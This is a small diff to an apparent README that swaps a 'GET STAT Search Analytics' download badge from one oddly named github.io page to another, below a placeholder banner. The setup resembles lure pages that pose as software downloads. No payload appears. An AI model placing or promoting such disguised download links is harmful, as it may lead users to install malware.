@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=40362fa114ff43d6544ca18c7549af6f87d71924-9136745-images-thumbs&n=13)
 
-[![GET STAT Search Analytics](https://img.shields.io/badge/GET%20%E2%80%94%20STAT%20Search%20Analytics-0078D6?style=for-the-badge&logoColor=white)](https://tpm-health-diagnostic-tools.github.io/.github/stat-search-analytics)
+[![GET STAT Search Analytics](https://img.shields.io/badge/GET%20%E2%80%94%20STAT%20Search%20Analytics-0078D6?style=for-the-badge&logoColor=white)](https://chasepersonzvvs.github.io/.github/stat-search-analytics)
 
 ---
 
